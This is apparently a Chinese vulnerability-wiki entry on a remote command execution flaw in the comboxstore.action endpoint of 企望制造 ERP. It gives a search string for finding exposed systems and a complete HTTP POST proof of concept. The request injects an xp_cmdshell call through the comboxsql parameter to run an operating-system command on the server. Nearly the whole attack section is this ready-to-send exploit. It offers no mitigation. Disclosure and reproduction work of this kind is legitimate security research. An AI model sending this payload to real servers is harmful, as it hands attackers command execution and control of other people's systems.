---
title: "企望制造 ERP comboxstore.action 远程命令执行漏洞"
date: 2026-10-16 09:10:20
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "企望制造-ERP"
tags:
  - "企望制造-ERP"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

企望制造 ERP comboxstore.action接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令

## 漏洞影响

企望制造 ERP

## 网络测绘

```
title="企望制造ERP系统"
```

## 漏洞复现

登陆页面

![image-20230828150159555](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828150159555.png)

验证POC

```
POST /mainFunctions/comboxstore.action HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 

comboxsql=exec%20xp_cmdshell%20'type%20C:\Windows\Win.ini'
```

![image-20230828150215433](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828150215433.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-ERP-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
